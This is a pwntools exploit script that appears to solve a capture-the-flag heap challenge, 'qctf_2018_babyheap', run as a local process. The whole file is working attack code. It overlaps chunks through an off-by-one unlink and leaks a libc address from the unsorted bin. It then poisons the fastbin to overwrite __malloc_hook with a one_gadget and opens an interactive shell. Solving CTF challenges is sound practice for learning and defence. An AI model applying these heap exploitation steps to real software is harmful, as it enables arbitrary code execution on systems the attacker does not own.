from pwn import *
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_50_qctf_2018_babyheap')
libc = elf.libc
p = process('./data/bin/heap23_50_qctf_2018_babyheap') 
main_arena_offset = 0x3c4b20
one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]

def create(size, data):
    p.sendlineafter(b'Your choice :\n', b'1')
    p.sendlineafter(b'Size: \n', str(size).encode())
    p.sendlineafter(b'Data: \n', data)

def delete(index):
    p.sendlineafter(b'Your choice :\n', b'2')
    p.sendlineafter(b'Index: \n', str(index).encode())

def show():
    p.sendlineafter(b'Your choice :\n', b'3')

create(0x108, b'A')    # <1>
create(0x108, b'B')
create(0x68, b'C')
create(0x68, b'D')
create(0x108, b'E'*0xf0+p64(0x100)+p64(0x11))
delete(2)
delete(3)
delete(0)

create(0x68, b'F'*0x60 + p64(0x300))    # <2>
delete(4)   #unlink
create(0x108, b'G')
show()
p.recvuntil(b'1 : ')
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - (main_arena_offset + 88)
malloc_hook = libc_base + libc.sym['__malloc_hook']

create(0x128, b'H'*0x100 + p64(0) + p64(0x71) + p64(malloc_hook - 0x23))    # <3>
create(0x68, b'I')
create(0x68, b'\0'*(0xb+0x8) + p64(one_gadget[3]+libc_base))
create(0x20, b'GetShell!!!')
p.interactive()